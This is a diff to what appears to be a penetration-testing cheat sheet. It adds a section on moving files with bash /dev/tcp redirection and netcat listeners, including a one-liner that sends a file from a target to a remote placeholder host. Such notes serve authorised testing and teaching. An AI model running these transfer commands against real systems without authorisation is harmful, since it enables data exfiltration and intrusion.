@@ -612,6 +612,22 @@ $ file <file>
 
 > https://gtfobins.github.io/#+file%20upload
 
+### Bash File Transfer
+
+#### To the Target
+
+```c
+$ bash -c "cat < /dev/tcp/<RHOST>/<RPORT> > <FILE>"
+$ nc -lnvp <LPORT> < <FILE>
+```
+
+#### From the Target
+
+```c
+$ bash -c "cat < <FILE> > /dev/tcp/<RHOST>/<RPORT>" 
+$ nc -lnvp <LPORT> > <FILE>
+```
+
 ### cancel
 
 ```c
